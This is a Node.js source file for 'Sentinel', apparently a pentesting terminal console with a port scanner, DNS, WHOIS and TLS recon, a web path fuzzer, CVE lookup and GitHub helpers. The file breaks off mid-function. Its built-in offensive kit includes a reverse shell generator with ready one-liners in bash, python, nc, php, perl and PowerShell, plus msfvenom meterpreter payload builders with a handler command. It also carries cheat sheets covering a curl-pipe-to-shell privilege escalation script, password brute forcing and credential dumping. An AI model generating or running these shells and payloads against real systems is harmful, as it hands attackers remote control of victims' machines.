#!/usr/bin/env node
"use strict";
/*!
 * Sentinel — Terminal Edition
 * A dependency-free CLI/TUI security console for Windows and Linux.
 * Uses only Node.js built-ins. MIT License. Copyright (c) 2026 Sentinel.
 * Use only on systems you own or are explicitly authorized to test.
 */
const net = require("net");
const tls = require("tls");
const http = require("http");
const https = require("https");
const { execFile, spawn } = require("child_process");
const crypto = require("crypto");
const readline = require("readline");
const os = require("os");
const dnsp = require("dns").promises;
const VERSION = "2.31.0";

// ---------- colors ----------
const useColor = process.stdout.isTTY && !process.env.NO_COLOR;
let tuiActive = false; // set while the full-screen TUI owns the terminal, so the global SIGINT handler defers to the TUI's own cleanup
const A = { reset: "\x1b[0m", b: "\x1b[1m", dim: "\x1b[2m", cyan: "\x1b[36m", green: "\x1b[32m", red: "\x1b[31m", yellow: "\x1b[33m", mag: "\x1b[35m", gray: "\x1b[90m", blue: "\x1b[34m" };
const p = (code, s) => (useColor ? code + s + A.reset : s);
const cyan = (s) => p(A.cyan, s), green = (s) => p(A.green, s), red = (s) => p(A.red, s), yellow = (s) => p(A.yellow, s), gray = (s) => p(A.gray, s), bold = (s) => p(A.b, s), mag = (s) => p(A.mag, s), blue = (s) => p(A.blue, s), dim = (s) => p(A.dim, s);

const { frameDiff, diffTokens, wordHi } = require("./lib/diff"); // terminal render helpers (lib/diff.js)
const { loopDecision, clampRounds, loopPrompt } = require("./lib/loop"); // autonomous /loop controller (lib/loop.js)
const { defang, refang } = require("./lib/ioc"); // IOC defang/refang tool (lib/ioc.js)
const { assess: entropyAssess } = require("./lib/entropy"); // Shannon entropy tool (lib/entropy.js)
const { convert: epochConvert } = require("./lib/epoch"); // timestamp converter (lib/epoch.js)
const { parseUrl } = require("./lib/urlparse"); // URL breakdown tool (lib/urlparse.js)
const { base32encode, base32decode } = require("./lib/base32"); // base32 (lib/base32.js)
const { totp, secondsRemaining } = require("./lib/totp"); // TOTP 2FA codes (lib/totp.js)
const { analyzeJwt } = require("./lib/jwt"); // JWT decode + expiry/alg analysis (lib/jwt.js)
const { parseUA } = require("./lib/useragent"); // User-Agent parser (lib/useragent.js)

// ---------- data ----------
const { SERVICES, portLookup } = require("./lib/ports"); // port<->service map + lookup (lib/ports.js)
const { TOP_PORTS, parsePorts, idHash, parseCve, cidrCalc, inCidr } = require("./lib/scanutil"); // security-console core logic (lib/scanutil.js)

const SHELLS = {
  bash: (i, o) => `bash -i >& /dev/tcp/${i}/${o} 0>&1`,
  python3: (i, o) => `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${i}",${o}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/sh")'`,
  nc: (i, o) => `nc -e /bin/sh ${i} ${o}`,
  "nc-mkfifo": (i, o) => `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${i} ${o} >/tmp/f`,
  php: (i, o) => `php -r '$s=fsockopen("${i}",${o});exec("/bin/sh -i <&3 >&3 2>&3");'`,
  perl: (i, o) => `perl -e 'use Socket;$i="${i}";$p=${o};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`,
  powershell: (i, o) => `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('${i}',${o});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($k=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$k);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}"`,
};

const CHEATS = {
  "nmap": ["nmap -sV -sC -oN scan.txt TARGET", "nmap -p- --min-rate 5000 -T4 TARGET", "nmap --script vuln TARGET"],
  "shells": ["bash -i >& /dev/tcp/IP/PORT 0>&1", "nc -lvnp 4444   # listener", "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'   # upgrade TTY"],
  "privesc": ["find / -perm -4000 -type f 2>/dev/null   # SUID", "sudo -l", "cat /etc/crontab", "curl -L .../linpeas.sh | sh"],
  "transfer": ["python3 -m http.server 8000", "curl http://IP:8000/f -o f", "wget http://IP:8000/f"],
  "web": ["gobuster dir -u http://TARGET -w common.txt", "ffuf -u http://TARGET/FUZZ -w list.txt", "sqlmap -u 'http://TARGET/?id=1' --batch --dbs"],
  "cracking": ["hashcat -m 0 hash.txt rockyou.txt", "john --wordlist=rockyou.txt hash.txt", "hydra -L users -P rockyou.txt ssh://TARGET"],
  "windows": ["evil-winrm -i TARGET -u USER -p PASS", "impacket-secretsdump DOM/USER:PASS@TARGET", "crackmapexec smb TARGET"],
};

const TOOLS = [
  ["nmap", "Recon", "sudo apt install -y nmap"],
  ["masscan", "Recon", "sudo apt install -y masscan"],
  ["gobuster", "Web", "sudo apt install -y gobuster"],
  ["ffuf", "Web", "sudo apt install -y ffuf"],
  ["nuclei", "Web", "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"],
  ["sqlmap", "Web", "sudo apt install -y sqlmap"],
  ["hydra", "Passwords", "sudo apt install -y hydra"],
  ["hashcat", "Passwords", "sudo apt install -y hashcat"],
  ["john", "Passwords", "sudo apt install -y john"],
  ["metasploit", "Exploit", "sudo apt install -y metasploit-framework"],
  ["impacket", "Post-ex", "pipx install impacket"],
  ["crackmapexec", "Post-ex", "pipx install crackmapexec"],
];

// ---------- helpers ----------
function banner() {
  const art = [
    "  ███████╗███████╗███╗   ██╗████████╗██╗███╗   ██╗███████╗██╗     ",
    "  ██╔════╝██╔════╝████╗  ██║╚══██╔══╝██║████╗  ██║██╔════╝██║     ",
    "  ███████╗█████╗  ██╔██╗ ██║   ██║   ██║██╔██╗ ██║█████╗  ██║     ",
    "  ╚════██║██╔══╝  ██║╚██╗██║   ██║   ██║██║╚██╗██║██╔══╝  ██║     ",
    "  ███████║███████╗██║ ╚████║   ██║   ██║██║ ╚████║███████╗███████╗",
    "  ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝",
  ];
  // smooth vertical cyan → violet → magenta gradient (256-color, falls back to plain)
  const grad = ["38;5;51", "38;5;45", "38;5;44", "38;5;99", "38;5;134", "38;5;170"];
  console.log("");
  if (useColor) art.forEach((l, i) => console.log("\x1b[1;" + grad[i] + "m" + l + "\x1b[0m"));
  else art.forEach((l) => console.log(l));
  console.log("  " + gray("╭─ ") + bold(cyan("security console")) + gray(" · terminal edition · ") + mag("v" + VERSION) + gray(" · ") + gray(os.platform() + "/" + os.arch()));
  console.log("  " + gray("╰─ ") + dim("only what you own or are authorized to test.") + "\n");
}
const rl = () => readline.createInterface({ input: process.stdin, output: process.stdout });
function ask(q) { return new Promise((res) => { const r = rl(); r.question(cyan("  " + q + " "), (a) => { r.close(); res(a.trim()); }); }); }
// Claude-Code-style bordered chat input box.
function chatInput() {
  return new Promise((res) => {
    const W = 58;
    process.stdout.write(cyan("  ╭─ ") + gray("you") + cyan(" " + "─".repeat(W - 6) + "╮") + "\n");
    const r = rl();
    r.question(cyan("  │ ") + mag("› "), (a) => {
      r.close();
      process.stdout.write(cyan("  ╰" + "─".repeat(W) + "╯") + "\n\n");
      res(a.trim());
    });
  });
}
function h1(t) { console.log("\n  " + bold(cyan("▌ " + t)) + "\n"); }
function ok(s) { return green("● ") + s; }
function copyHint(cmd) { console.log("  " + cmd); }

// ---------- port scanner ----------
function scan(host, ports, timeout = 900, conc = 250) {
  return new Promise((resolve) => {
    const open = []; let idx = 0, done = 0;
    const total = ports.length;
    const tick = () => { if (process.stdout.isTTY) { readline.clearLine(process.stdout, 0); readline.cursorTo(process.stdout, 0); process.stdout.write("  " + gray(`scanned ${done}/${total} · ${open.length} open`)); } };
    const probe = (port) => new Promise((r) => {
      const s = new net.Socket(); let fin = false, banner = "";
      const end = (isOpen) => { if (fin) return; fin = true; try { s.destroy(); } catch (_) {}
        if (isOpen) { open.push(port); if (process.stdout.isTTY) { readline.clearLine(process.stdout, 0); readline.cursorTo(process.stdout, 0); } console.log("  " + green(String(port).padEnd(7)) + (SERVICES[port] || "").padEnd(12) + gray(banner.slice(0, 60))); }
        r(); };
      s.setTimeout(timeout);
      s.once("connect", () => { s.once("data", (d) => { banner = d.toString("utf8").replace(/[^\x20-\x7e]/g, " ").trim(); end(true); }); setTimeout(() => end(true), 150); });
      s.once("timeout", () => end(false));
      s.once("error", () => end(false));
      try { s.connect(port, host); } catch (_) { end(false); }
    });
    const worker = async () => { while (true) { const i = idx++; if (i >= total) return; await probe(ports[i]); done++; tick(); } };
    console.log("  " + gray(`PORT   SERVICE     BANNER`));
    Promise.all(Array.from({ length: Math.min(conc, total) }, worker)).then(() => {
      if (process.stdout.isTTY) { readline.clearLine(process.stdout, 0); readline.cursorTo(process.stdout, 0); }
      console.log("  " + ok(`${open.length} open port${open.length === 1 ? "" : "s"} on ${host}`));
      if (open.length) console.log("  " + gray("nmap: ") + `nmap -sV -sC -p ${open.join(",")} ${host}`);
      resolve(open);
    });
  });
}

// ---------- encoders / hashes ----------
const ENC = {
  b64e: (s) => Buffer.from(s, "utf8").toString("base64"),
  b64d: (s) => Buffer.from(s, "base64").toString("utf8"),
  hexe: (s) => Buffer.from(s, "utf8").toString("hex"),
  hexd: (s) => Buffer.from(s, "hex").toString("utf8"),
  urle: (s) => encodeURIComponent(s),
  urld: (s) => decodeURIComponent(s),
  base32e: (s) => base32encode(s),
  base32d: (s) => { const r = base32decode(s); return r == null ? "(invalid base32)" : r; },
};
function hashes(s) { return ["md5", "sha1", "sha256", "sha512"].map((a) => "  " + a.padEnd(8) + cyan(crypto.createHash(a).update(s).digest("hex"))).join("\n"); }

// ---------- recon: DNS / WHOIS / headers ----------
async function dnsLookup(host) {
  host = host.replace(/^https?:\/\//, "").split("/")[0];
  const kinds = [["A", "resolve4"], ["AAAA", "resolve6"], ["MX", "resolveMx"], ["NS", "resolveNs"], ["TXT", "resolveTxt"], ["CNAME", "resolveCname"]];
  const out = [];
  for (const [label, fn] of kinds) { try { for (const v of (await dnsp[fn](host)) || []) out.push([label, label === "MX" ? v.priority + " " + v.exchange : Array.isArray(v) ? v.join("") : v]); } catch (_) {} }
  try { const a = await dnsp.resolve4(host); if (a[0]) for (const ptr of (await dnsp.reverse(a[0]).catch(() => [])) || []) out.push(["PTR", ptr]); } catch (_) {}
  return out;
}
function whoisAsk(server, query) {
  return new Promise((res) => { const s = net.connect(43, server); let data = ""; s.setTimeout(9000);
    s.on("connect", () => s.write(query + "\r\n")); s.on("data", (d) => (data += d.toString()));
    s.on("end", () => res(data)); s.on("timeout", () => { try { s.destroy(); } catch (_) {} res(data); }); s.on("error", () => res(data)); });
}
async function whois(query) {
  query = query.replace(/^https?:\/\//, "").split("/")[0];
  let t = await whoisAsk("whois.iana.org", query);
  const ref = (t.match(/refer:\s*(\S+)/i) || [])[1] || (t.match(/whois:\s*(\S+)/i) || [])[1];
  if (ref) { const m = await whoisAsk(ref, query); if (m && m.trim()) t = m; }
  return t.trim();
}
const SEC = [["strict-transport-security", "HSTS"], ["content-security-policy", "CSP"], ["x-frame-options", "X-Frame-Options"], ["x-content-type-options", "X-Content-Type-Options"], ["referrer-policy", "Referrer-Policy"], ["permissions-policy", "Permissions-Policy"]];
async function headers(url) {
  if (!/^https?:\/\//.test(url)) url = "https://" + url;
  const r = await fetch(url, { redirect: "follow" }).catch((e) => ({ __err: e.message }));
  if (r.__err) return { err: r.__err };
  const h = {}; r.headers.forEach((v, k) => (h[k] = v));
  return { status: r.status, server: h.server || "?", h };
}

function certInspect(host) {
  host = host.replace(/^https?:\/\//, "").split("/")[0];
  return new Promise((res) => {
    let done = false; const fin = (v) => { if (done) return; done = true; res(v); };
    const s = tls.connect({ host, port: 443, servername: host, rejectUnauthorized: false, timeout: 9000 }, () => {
      const c = s.getPeerCertificate(false), flat = (o) => Object.entries(o || {}).map(([k, v]) => k + "=" + v).join(", ");
      fin({ ok: true, protocol: s.getProtocol(), cipher: (s.getCipher() || {}).name, subject: flat(c.subject), issuer: flat(c.issuer), valid_from: c.valid_from, valid_to: c.valid_to, san: (c.subjectaltname || "").replace(/DNS:/g, ""), serial: c.serialNumber, fp: c.fingerprint256, daysLeft: c.valid_to ? Math.round((new Date(c.valid_to) - Date.now()) / 86400000) : null });
      s.end();
    });
    s.on("error", (e) => fin({ ok: false, error: e.message }));
    s.on("timeout", () => { try { s.destroy(); } catch (_) {} fin({ ok: false, error: "timeout" }); });
  });
}
async function subs(domain) {
  domain = domain.replace(/^https?:\/\//, "").split("/")[0].toLowerCase();
  const ctrl = new AbortController(), to = setTimeout(() => ctrl.abort(), 20000);
  try {
    const r = await fetch("https://crt.sh/?q=%25." + encodeURIComponent(domain) + "&output=json", { signal: ctrl.signal, headers: { "User-Agent": "Sentinel" } });
    const txt = await r.text(); let data;
    try { data = JSON.parse(txt); } catch { return { err: "crt.sh is busy — try again in a moment" }; }
    const set = new Set();
    for (const e of data) for (const n of String(e.name_value || "").split("\n")) { const s = n.trim().toLowerCase(); if (s && !s.includes("*") && (s === domain || s.endsWith("." + domain))) set.add(s); }
    return [...set].sort();
  } catch (e) { return { err: e.name === "AbortError" ? "crt.sh timed out" : e.message }; }
  finally { clearTimeout(to); }
}

// ---------- content fuzzer ----------
const COMMON_PATHS = ["admin", "administrator", "login", "logout", "register", "dashboard", "api", "api/v1", "v1", "v2", ".git", ".git/config", ".env", "config", "config.php", "wp-admin", "wp-login.php", "wp-content", "phpmyadmin", "robots.txt", "sitemap.xml", "backup", "backups", "backup.zip", "db", "database", "dump.sql", "test", "dev", "staging", "uploads", "images", "assets", "js", "css", "includes", "tmp", "old", ".htaccess", ".htpasswd", "server-status", "status", "health", "healthz", "metrics", "actuator", "actuator/health", "swagger", "swagger-ui", "api-docs", "graphql", "console", "debug", "info.php", "phpinfo.php", "README.md", "CHANGELOG.md", "LICENSE", ".DS_Store", "web.config", "crossdomain.xml", ".well-known/security.txt", "users", "user", "account", "profile", "settings", "private", "secret", "internal", "portal", "cpanel", "webmail", "mail", "ftp", "git", "svn", ".svn", "vendor", "composer.json", "package.json", "Dockerfile", "docker-compose.yml", ".gitignore", "error_log", "logs", "log"];
function headReq(url, to) {
  return new Promise((res) => {
    let u; try { u = new URL(url); } catch (_) { return res(null); }
    const lib = u.protocol === "https:" ? https : http;
    const req = lib.request(u, { method: "GET", timeout: to || 8000, rejectUnauthorized: false, headers: { "User-Agent": "Sentinel" } }, (r) => { const o = { status: r.statusCode, len: r.headers["content-length"] || "", loc: r.headers["location"] || "" }; r.destroy(); res(o); });
    req.on("timeout", () => { req.destroy(); res(null); });
    req.on("error", () => res(null));
    req.end();
  });
}
async function fuzz(base, wlFile) {
  if (!base) { console.log("  " + red("usage: fuzz <url> [wordlist-file]")); return; }
  if (!/^https?:\/\//i.test(base)) base = "http://" + base;
  base = base.replace(/\/+$/, "");
  let words = COMMON_PATHS;
  if (wlFile) { try { words = require("fs").readFileSync(wlFile, "utf8").split("\n").map((s) => s.trim()).filter(Boolean); } catch (_) { console.log("  " + red("can't read " + wlFile)); return; } }
  console.log("  " + gray("fuzzing " + base + " (" + words.length + " paths)"));
  let idx = 0, found = 0;
  const color = (s) => s < 300 ? green : s < 400 ? cyan : (s === 401 || s === 403) ? yellow : gray;
  const probe = async (w) => { const r = await headReq(base + "/" + w.replace(/^\//, ""), 8000); if (r && r.status && r.status !== 404) { found++; console.log("  " + color(r.status)(String(r.status)) + "  /" + w.replace(/^\//, "") + gray(r.loc ? "  -> " + r.loc : (r.len ? "  " + r.len + "b" : ""))); } };
  const worker = async () => { while (true) { const i = idx++; if (i >= words.length) return; await probe(words[i]); } };
  await Promise.all(Array.from({ length: Math.min(25, words.length) }, worker));
  console.log("  " + ok(found + " path" + (found === 1 ? "" : "s") + " found on " + base));
}

// ---------- CVE search (NVD) ----------
async function cveSearch(q) {
  q = (q || "").trim();
  if (!q) { console.log("  " + red("usage: cve <keyword or CVE-id>")); return; }
  const isId = /^CVE-\d{4}-\d+$/i.test(q);
  const url = "https://services.nvd.nist.gov/rest/json/cves/2.0?" + (isId ? "cveId=" + q.toUpperCase() : "keywordSearch=" + encodeURIComponent(q)) + "&resultsPerPage=15";
  console.log("  " + gray("searching NVD..."));
  const r = await fetch(url, { headers: { "User-Agent": "Sentinel" } }).catch((e) => ({ __err: e.message }));
  if (r.__err) { console.log("  " + red(r.__err)); return; }
  if (!r.ok) { console.log("  " + red(r.status + (r.status === 403 ? " — NVD rate limit, wait a moment" : " " + r.statusText))); return; }
  const d = await r.json();
  if (!d.vulnerabilities || !d.vulnerabilities.length) { console.log("  " + gray("no results")); return; }
  console.log("  " + gray(d.totalResults + " total, showing " + Math.min(15, d.vulnerabilities.length)));
  d.vulnerabilities.slice(0, 15).forEach((v) => { const c = parseCve(v); const tag = c.score ? " [" + c.sev + " " + c.score + "]" : ""; console.log("  " + cyan(c.id) + yellow(tag) + " " + c.desc.slice(0, 78)); });
}

// ---------- GitHub (system git + token) ----------
function sh(args, opts) { return new Promise((res) => execFile("git", args, { maxBuffer: 1e7, ...opts }, (err, stdout, stderr) => res({ err, stdout, stderr }))); }
const ghToken = () => process.env.SENTINEL_GH_TOKEN || process.env.GITHUB_TOKEN || "";
const ghAuth = (url, t) => (t && /^https:\/\//i.test(url)) ? url.replace(/^https:\/\//i, "https://" + t + "@") : url;
const ghScrub = (s, t) => String(s || "").split(t || " __none__").join("***").trim();
async function gitClone(url) {
  if (!/^https:\/\//i.test(url)) { console.log("  " + red("use an https repo URL")); return; }
  const t = ghToken(), name = (url.split("/").pop() || "repo").replace(/\.git$/, "");
  console.log("  " + gray("cloning " + name + "..."));
  const r = await sh(["clone", ghAuth(url, t), name]);
  if (r.err) { console.log("  " + red(ghScrub(r.stderr || r.err.message, t))); return; }
  await sh(["-C", name, "remote", "set-url", "origin", url]);
  console.log("  " + ok("cloned into ./" + name));
}
async function gitPush(msg) {
  const t = ghToken();
  await sh(["add", "-A"]);
  await sh(["-c", "user.name=Sentinel", "-c", "user.email=sentinel@local", "commit", "-m", msg || "Update via Sentinel"]);
  const remote = (await sh(["remote", "get-url", "origin"])).stdout.trim();
  const branch = (await sh(["rev-parse", "--abbrev-ref", "HEAD"])).stdout.trim();
  const p = await sh(["push", ghAuth(remote, t), "HEAD:" + branch]);
  console.log("  " + (p.err ? red(ghScrub(p.stderr || p.err.message, t)) : ok("pushed to " + branch)));
}
async function gitStatus() { const r = await sh(["status", "--short", "-b"]); console.log((r.stdout || r.stderr || "").trim().split("\n").map((l) => "  " + l).join("\n")); }
async function gitPull() {
  const t = ghToken(), remote = (await sh(["remote", "get-url", "origin"])).stdout.trim();
  const r = await sh(["pull", ghAuth(remote, t)]);
  console.log("  " + (r.err ? red(ghScrub(r.stderr || r.err.message, t)) : ok("pulled\n  " + (r.stdout || "").trim())));
}
async function ghApiJson(path, method, body) {
  const t = ghToken();
  const opt = { method: method || "GET", headers: { Accept: "application/vnd.github+json", "User-Agent": "Sentinel" } };
  if (t) opt.headers.Authorization = "Bearer " + t;
  if (body) { opt.body = JSON.stringify(body); opt.headers["Content-Type"] = "application/json"; }
  const r = await fetch("https://api.github.com" + path, opt).catch((e) => ({ __err: e.message }));
  if (r.__err) return { err: r.__err };
  if (!r.ok) return { err: r.status + " " + r.statusText };
  return { data: await r.json() };
}
async function gitBranches() { const r = await sh(["branch", "-a"]); console.log((r.stdout || r.stderr || "").replace(/^/gm, "  ").trimEnd()); }
async function gitLog() { const r = await sh(["log", "--oneline", "-20", "--no-color"]); console.log((r.stdout || r.stderr || "no commits").replace(/^/gm, "  ").trimEnd()); }
async function gitDiff(file) { const r = await sh(file ? ["diff", "--no-color", "--", file] : ["diff", "--no-color"]); const t = (r.stdout || "").trimEnd(); console.log(t ? t : "  " + gray("no working-tree changes")); }
async function ghNewIssue(repo, title, body) {
  if (!repo || !repo.includes("/") || !title) { console.log("  " + red('usage: git issue <owner/repo> "title" ["body"]')); return; }
  const r = await ghApiJson("/repos/" + repo + "/issues", "POST", { title, body: body || "" });
  if (r.err) { console.log("  " + red(r.err)); return; }
  console.log("  " + ok("created #" + r.data.number) + " " + gray(r.data.html_url));
}
async function ghNewPR(title, base) {
  const remote = (await sh(["remote", "get-url", "origin"])).stdout.trim();
  const m = remote.match(/github\.com[:/]([^/]+\/[^/.]+?)(?:\.git)?$/i), repo = m && m[1];
  if (!repo) { console.log("  " + red("no github remote")); return; }
  if (!title) { console.log("  " + red('usage: git pr "title" [base]')); return; }
  const head = (await sh(["rev-parse", "--abbrev-ref", "HEAD"])).stdout.trim();
  if (!base) { const ri = await ghApiJson("/repos/" + repo); base = (ri.data && ri.data.default_branch) || "main"; }
  if (head === base) { console.log("  " + red("on base branch (" + base + ") — checkout a feature branch first")); return; }
  const r = await ghApiJson("/repos/" + repo + "/pulls", "POST", { title, head, base, body: "" });
  if (r.err) { console.log("  " + red(r.err)); return; }
  console.log("  " + ok("created PR #" + r.data.number) + " " + gray(r.data.html_url));
}
async function ghComment(repo, num, body) {
  if (!repo || !repo.includes("/") || !num || !body) { console.log("  " + red('usage: git comment <owner/repo> <number> "text"')); return; }
  const r = await ghApiJson("/repos/" + repo + "/issues/" + num + "/comments", "POST", { body });
  if (r.err) { console.log("  " + red(r.err)); return; }
  console.log("  " + ok("commented on #" + num) + " " + gray(r.data.html_url));
}
async function ghGists() {
  const r = await ghApiJson("/gists?per_page=30");
  if (r.err) { console.log("  " + red(r.err)); return; }
  if (!r.data.length) { console.log("  " + gray("no gists")); return; }
  r.data.forEach((g) => console.log("  " + (g.public ? gray("public") : yellow("secret")) + " " + (Object.keys(g.files)[0] || "gist") + gray("  " + g.html_url)));
}
async function ghNewGist(file, desc) {
  if (!file) { console.log("  " + red("usage: git gist <file> [description]")); return; }
  let content; try { content = require("fs").readFileSync(file, "utf8"); } catch (_) { console.log("  " + red("can't read " + file)); return; }
  const name = file.split(/[\\/]/).pop();
  const r = await ghApiJson("/gists", "POST", { description: desc || "", public: true, files: { [name]: { content } } });
  if (r.err) { console.log("  " + red(r.err)); return; }
  console.log("  " + ok("gist created") + " " + gray(r.data.html_url));
}
async function gitCheckout(name) {
  if (!name) { console.log("  " + red("usage: git checkout <branch>")); return; }
  const r = await sh(["checkout", name]);
  console.log("  " + (r.err ? red((r.stderr || r.err.message).trim()) : ok("switched to " + name)));
}
async function ghIssues(repo, kind) {
  if (!repo || !repo.includes("/")) { console.log("  " + red("usage: git " + (kind === "pulls" ? "prs" : "issues") + " <owner/repo>")); return; }
  const r = await ghApiJson("/repos/" + repo + "/" + (kind === "pulls" ? "pulls" : "issues") + "?state=open&per_page=25");
  if (r.err) { console.log("  " + red(r.err)); return; }
  const items = (kind === "pulls" ? r.data : r.data.filter((x) => !x.pull_request));
  if (!items.length) { console.log("  " + gray("none open")); return; }
  items.forEach((x) => console.log("  " + cyan((kind === "pulls" ? "PR#" : "#") + x.number) + " " + x.title + gray("  @" + (x.user ? x.user.login : "?"))));
}
async function ghReposList() {
  const r = await ghApiJson("/user/repos?sort=updated&per_page=100");
  if (r.err) { console.log("  " + red(r.err)); return; }
  r.data.forEach((x) => console.log("  " + (x.private ? yellow("private") : gray("public ")) + " " + bold(x.full_name) + gray("  " + x.clone_url)));
}
async function ghNewRepo(name) {
  if (!name) { console.log("  " + red("usage: git new <name>")); return; }
  const r = await ghApiJson("/user/repos", "POST", { name, private: true, auto_init: true });
  if (r.err) { console.log("  " + red(r.err)); return; }
  console.log("  " + ok("created " + r.data.full_name) + "\n  " + gray(r.data.clone_url));
}

// ---------- interactive menus ----------
async function menuScan() {
  h1("Port scanner");
  const host = await ask("host / IP:");
  if (!host) return;
  const spec = await ask("ports [top / 1-1024 / 80,443]:") || "top";
  console.log("");
  await scan(host, parsePorts(spec));
}
async function menuDns() {
  h1("DNS lookup");
  const host = await ask("domain:"); if (!host) return;
  console.log("");
  const recs = await dnsLookup(host);
  if (!recs.length) { console.log("  " + red("no records found")); return; }
  recs.forEach(([k, v]) => console.log("  " + cyan(k.padEnd(6)) + v));
}
async function menuWhois() {
  h1("WHOIS");
  const q = await ask("domain / IP:"); if (!q) return;
  console.log("\n  " + gray("querying whois..."));
  const t = await whois(q); console.log("");
  console.log(t.split("\n").slice(0, 60).map((l) => "  " + l).join("\n"));
}
async function menuHeaders() {
  h1("HTTP security headers");
  const url = await ask("url:"); if (!url) return;
  console.log("\n  " + gray("fetching..."));
  const r = await headers(url); console.log("");
  if (r.err) { console.log("  " + red(r.err)); return; }
  console.log("  " + ok(r.status + " · server: " + r.server));
  SEC.forEach(([k, label]) => { const on = r.h[k] !== undefined; console.log("  " + (on ? green("●") : red("●")) + " " + label.padEnd(24) + (on ? gray(String(r.h[k]).slice(0, 60)) : gray("missing"))); });
}
async function menuCert() {
  h1("TLS certificate");
  const host = await ask("host:"); if (!host) return;
  console.log("\n  " + gray("connecting..."));
  const c = await certInspect(host); console.log("");
  if (!c.ok) { console.log("  " + red(c.error)); return; }
  const d = c.daysLeft, exp = d == null ? "" : d < 0 ? red("EXPIRED " + -d + "d ago") : d < 21 ? yellow(d + "d left") : green(d + "d left");
  console.log("  " + ok(c.protocol + " · " + c.cipher + "  " + exp));
  [["Subject", c.subject], ["Issuer", c.issuer], ["Valid", c.valid_from + " -> " + c.valid_to], ["SAN", c.san], ["Serial", c.serial], ["SHA-256", c.fp]].forEach(([k, v]) => console.log("  " + cyan(k.padEnd(9)) + gray(String(v))));
}
async function menuSubs() {
  h1("Subdomains · certificate transparency");
  const dom = await ask("domain:"); if (!dom) return;
  console.log("\n  " + gray("querying crt.sh..."));
  const r = await subs(dom); console.log("");
  if (r.err) { console.log("  " + red(r.err)); return; }
  console.log("  " + ok(r.length + " subdomains"));
  r.forEach((s) => console.log("  " + s));
}
async function menuGit() {
  h1("GitHub");
  console.log("  token: " + (ghToken() ? green("set (env)") : red("not set — export SENTINEL_GH_TOKEN=ghp_...")));
  console.log("  actions: clone push pull status log diff branch checkout repos new issues prs issue pr comment gists gist\n");
  const act = await ask("action:");
  console.log("");
  if (act === "clone") { const url = await ask("repo url:"); if (url) { console.log(""); await gitClone(url); } }
  else if (act === "push") { const m = await ask("commit message:"); console.log(""); await gitPush(m); }
  else if (act === "pull") await gitPull();
  else if (act === "status") await gitStatus();
  else if (act === "branch") await gitBranches();
  else if (act === "checkout") { const b = await ask("branch:"); console.log(""); await gitCheckout(b); }
  else if (act === "log") await gitLog();
  else if (act === "diff") await gitDiff();
  else if (act === "issue") { const r = await ask("owner/repo:"); const t = await ask("title:"); console.log(""); await ghNewIssue(r, t); }
  else if (act === "repos") await ghReposList();
  else if (act === "new") { const n = await ask("repo name:"); console.log(""); await ghNewRepo(n); }
  else if (act === "issues") { const r = await ask("owner/repo:"); console.log(""); await ghIssues(r, "issues"); }
  else if (act === "prs") { const r = await ask("owner/repo:"); console.log(""); await ghIssues(r, "pulls"); }
  else if (act === "pr") { const t = await ask("title:"); console.log(""); await ghNewPR(t); }
  else if (act === "comment") { const r = await ask("owner/repo:"); const n = await ask("issue #:"); const t = await ask("comment:"); console.log(""); await ghComment(r, n, t); }
  else if (act === "gists") await ghGists();
  else if (act === "gist") { const f = await ask("file path:"); console.log(""); await ghNewGist(f); }
  else console.log("  " + red("unknown action"));
}
async function menuShell() {
  h1("Reverse shell generator");
  console.log("  langs: " + Object.keys(SHELLS).join(", ") + "\n");
  const lang = (await ask("lang [bash]:")) || "bash";
  const ip = (await ask("LHOST [10.0.0.1]:")) || "10.0.0.1";
  const port = (await ask("LPORT [4444]:")) || "4444";
  console.log("\n  " + (SHELLS[lang] || SHELLS.bash)(ip, port) + "\n");
  console.log("  " + gray("listener: ") + `nc -lvnp ${port}`);
}
async function menuEncode() {
  h1("Encode / decode / hash");
  console.log("  ops: b64e b64d hexe hexd urle urld hash hashid\n");
  const op = await ask("op:");
  const val = await ask("input:");
  console.log("");
  try {
    if (op === "hash") console.log(hashes(val));
    else if (op === "hashid") console.log("  " + cyan(idHash(val)));
    else if (ENC[op]) console.log("  " + cyan(ENC[op](val)));
    else console.log("  " + red("unknown op"));
  } catch (e) { console.log("  " + red("error: " + e.message)); }
}
async function menuPayloads() {
  h1("Payload builders");
  const ip = (await ask("LHOST [10.0.0.1]:")) || "10.0.0.1";
  const port = (await ask("LPORT [4444]:")) || "4444";
  console.log("");
  console.log("  " + gray("linux elf   ") + `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} -f elf -o p.elf`);
  console.log("  " + gray("windows exe ") + `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} -f exe -o p.exe`);
  console.log("  " + gray("nc listener ") + `nc -lvnp ${port}`);
  console.log("  " + gray("http server ") + `python3 -m http.server 8000`);
  console.log("  " + gray("msf handler ") + `msfconsole -q -x "use exploit/multi/handler;set payload linux/x64/meterpreter/reverse_tcp;set LHOST ${ip};set LPORT ${port};run"`);
}
async function menuCheats() {
  h1("Cheat sheets");
  console.log("  topics: " + Object.keys(CHEATS).join(", ") + "\n");
  const t = await ask("topic:");
  const lines = CHEATS[t];
  console.log("");
  if (!lines) { console.log("  " + red("no such topic")); return; }
  lines.forEach((l) => console.log("  " + cyan("$ ") + l));
}
function listTools() {
  h1("Tools catalog");
  TOOLS.forEach(([n, cat, inst]) => console.log("  " + bold(n.padEnd(14)) + gray(cat.padEnd(10)) + inst));
  console.log("\n  " + gray("configure any tool with: ") + "sentinel setup <name>");
}
// Auto-configure a tool: run its install command, streaming output to the terminal.
function setupTool(name) {
  return new Promise((resolve) => {
